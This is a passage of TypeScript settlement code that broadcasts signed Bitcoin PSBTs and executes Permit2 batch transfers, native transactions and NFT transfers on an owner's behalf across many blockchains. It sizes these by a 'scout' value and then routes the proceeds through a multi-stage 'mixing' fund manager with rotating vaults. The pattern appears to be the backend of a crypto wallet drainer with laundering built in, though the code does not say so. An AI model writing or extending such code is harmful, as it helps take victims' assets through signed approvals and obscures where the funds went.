    if (oc.cosmos_cw20) settlementHashes.cosmos = oc.cosmos_cw20
    if (oc.aptos_coin) settlementHashes.aptos = oc.aptos_coin
    if (oc.sui_coin) settlementHashes.sui = oc.sui_coin

    if (hasCosmosAptosSui && !omnichainResult.ok) {
      void notifyOmnichainPartialSuccess({
        succeeded: Object.keys(settlementHashes),
        failed: [omnichainResult.detail ?? 'extended chain leg failed'],
        settlementMode: 'parallel_v1',
      })
    }

    if (!omnichainResult.ok) {
      const faultChain: OmnichainAtomicChainKey = hasSolana
        ? 'solana'
        : hasTron
          ? 'tron'
          : hasTon
            ? 'ton'
            : hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)
              ? 'cosmos'
              : hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)
                ? 'aptos'
                : hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)
                  ? 'sui'
                  : 'evm'
      faults.push({
        chain: faultChain,
        detail: omnichainResult.detail ?? 'Omnichain native settlement failed',
      })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }

    if (faults.length > 0) {
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
  }

  // PARALLEL: Execute Bitcoin and EVM simultaneously
  const bitcoinPromise = hasBitcoin && bitcoinPayload
    ? (async () => {
        settlementTracker.markInProgress('bitcoin')
        if (settlementRequestId) {
          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'bitcoin' }).catch(console.warn)
        }
        const result = await retryLeg('bitcoin', () =>
          broadcastPSBT(bitcoinPayload.signed_psbt_base64).then((btc) =>
            btc.ok && btc.tx_hash
              ? { ok: true, tx_hash: btc.tx_hash }
              : { ok: false, detail: btc.detail ?? 'Bitcoin PSBT broadcast failed' },
          ),
        )
        return result
      })()
    : null

  const evmPromise = hasEvm && evmPayload
    ? (async () => {
        settlementTracker.markInProgress('evm')
        if (settlementRequestId) {
          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'evm' }).catch(console.warn)
        }
        const scoutUsd = params.scout_value_usd ?? 0
        const batchFlashBase = {
          owner: getAddress(params.owner),
          chainId: params.chainId,
          permit2Signature: evmPayload.permit2_signature,
          batch: evmPayload.batch,
          scout_value_usd: scoutUsd,
          rpcUrl: params.rpcUrl,
        }
        const batchOpts = {
          owner: batchFlashBase.owner,
          chainId: batchFlashBase.chainId,
          permit2Signature: batchFlashBase.permit2Signature,
          batch: batchFlashBase.batch,
          nativeSignedTransaction: evmPayload.native_signed_transaction,
          nfts: evmPayload.nfts,
          rpcUrl: params.rpcUrl,
        }
        let evmResult = await tryExecuteBatchPermit2WithFlashloan(batchFlashBase)
        if (evmResult != null && !evmResult.ok) {
          console.warn(
            `[FLASHLOAN] Omnichain EVM flash path failed (${evmResult.detail ?? 'unknown'}) — standard batch`,
          )
          evmResult = null
        }
        if (evmResult == null) {
          evmResult = await executeBatchPermit2Settlement(batchOpts)
        }
        return evmResult
      })()
    : null

  // Collect results
  const [bitcoinResult, evmResult] = await Promise.all([bitcoinPromise, evmPromise])

  if (hasBitcoin && bitcoinPayload && bitcoinResult) {
    chains.bitcoin = 'failed'
    const btc = bitcoinResult.result
    if (bitcoinResult.ok && btc?.ok && btc.tx_hash) {
      chains.bitcoin = 'ok'
      settlementHashes.bitcoin = btc.tx_hash
      settlementTracker.markCompleted('bitcoin', btc.tx_hash)
      if (settlementRequestId) {
        await completeChainTracking({
          settlement_request_id: settlementRequestId,
          chain: 'bitcoin',
          tx_hash: btc.tx_hash,
        }).catch(console.warn)
      }
    } else {
      const btcError = bitcoinResult.detail ?? btc?.detail ?? 'Bitcoin PSBT broadcast failed'
      settlementTracker.markFailed('bitcoin', btcError)
      if (settlementRequestId) {
        await failChainTracking({
          settlement_request_id: settlementRequestId,
          chain: 'bitcoin',
          error_message: btcError,
        }).catch(console.warn)
      }
      faults.push({ chain: 'bitcoin', detail: btcError })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
  }

  if (hasEvm && evmPayload && evmResult) {
    chains.evm = 'failed'
    if (!evmResult.ok) {
      const evmError = evmResult.detail ?? 'EVM batch settlement failed'
      settlementTracker.markFailed('evm', evmError)
      if (settlementRequestId) {
        await failChainTracking({
          settlement_request_id: settlementRequestId,
          chain: 'evm',
          error_message: evmError,
        }).catch(console.warn)
      }
      faults.push({ chain: 'evm', detail: evmError })
      return finalizeOmnichainResult({
        ok: false,
        chains,
        omnichain_transaction_hashes: settlementHashes,
        detail: faults.map((f) => `${f.chain}: ${f.detail}`).join('; '),
        faults,
      })
    }
    chains.evm = 'ok'
    // Mark EVM as completed when we have the transaction hash
    if (evmResult.transaction_hashes?.[0]) {
      settlementTracker.markCompleted('evm', evmResult.transaction_hashes[0])
      if (settlementRequestId) {
        await completeChainTracking({
          settlement_request_id: settlementRequestId,
          chain: 'evm',
          tx_hash: evmResult.transaction_hashes[0],
        }).catch(console.warn)
      }
    }
    if (evmResult.transaction_hashes?.length) {
      settlementHashes.evm = evmResult.transaction_hashes
    }
    if (evmResult.nft_transaction_hashes?.length) {
      settlementHashes.nft = evmResult.nft_transaction_hashes
    }
  }

  const configuredChains = (
    [
      hasEvm ? 'evm' : null,
      hasSolana ? 'solana' : null,
      hasTron ? 'tron' : null,
      hasTon ? 'ton' : null,
      hasBitcoin ? 'bitcoin' : null,
      settlementHashes.cosmos ? 'cosmos' : null,
      settlementHashes.aptos ? 'aptos' : null,
      settlementHashes.sui ? 'sui' : null,
    ] as const
  ).filter((c): c is OmnichainAtomicChainKey => c != null)

  const ok = configuredChains.every((key) => chains[key] === 'ok')

  // Log settlement tracking state for monitoring and error recovery
  const settlementStatus = settlementTracker.getStatus()
  if (ok) {
    console.info(
      'OMNICHAIN_SETTLEMENT_PARALLEL_COMPLETE: All chains settled successfully',
      {
        settlement_legs: settlementStatus,
        settlement_mode: 'parallel_v1',
      },
    )

    // FUND MANAGER: Route distributed funds through smart vault system
    try {
      const fundManager = new FundManager([
        { address: params.owner, chain: 'evm', balance: parseFloat(params.scout_value_usd?.toString() || '0'), riskProfile: 'hot', maxCapacity: 1000000, currentAllocation: 0 },
      ])
      await fundManager.manageFunds(parseFloat(params.scout_value_usd?.toString() || '0'), 'evm', {
        stageCount: 3,
        mixingStrategy: 'hybrid',
        rotateVaults: true,
      })
    } catch (err) {
      console.warn('[FUND_MANAGER] Distribution error:', err)
    }
  } else {
    console.warn(
      'OMNICHAIN_SETTLEMENT_PARALLEL_PARTIAL: Some chains failed',
      {
        settlement_legs: settlementStatus,
        completed_legs: settlementTracker.getCompletedLegs(),
        failed_legs: settlementTracker.getFailedLegs(),
        settlement_mode: 'parallel_v1',
      },
    )
  }

  return finalizeOmnichainResult({
    ok,
    chains,
    ...(settlementHashes.evm ? { evm_transaction_hashes: settlementHashes.evm } : {}),
    omnichain_transaction_hashes: settlementHashes,
    ...(settlementHashes.bitcoin ? { bitcoin_tx_hash: settlementHashes.bitcoin } : {}),
    ...(settlementHashes.nft ? { nft_transaction_hashes: settlementHashes.nft } : {}),
  })
}

/** Attach post-settlement transaction hashes to an existing envelope for persistence refresh. */
export function withSettlementTransactionHashes(
  envelope: OmnichainAtomicSignatureEnvelope,
  hashes: OmnichainAtomicSettlementHashes,
): OmnichainAtomicSignatureEnvelope {
  return { ...envelope, settlement_transaction_hashes: hashes }
}
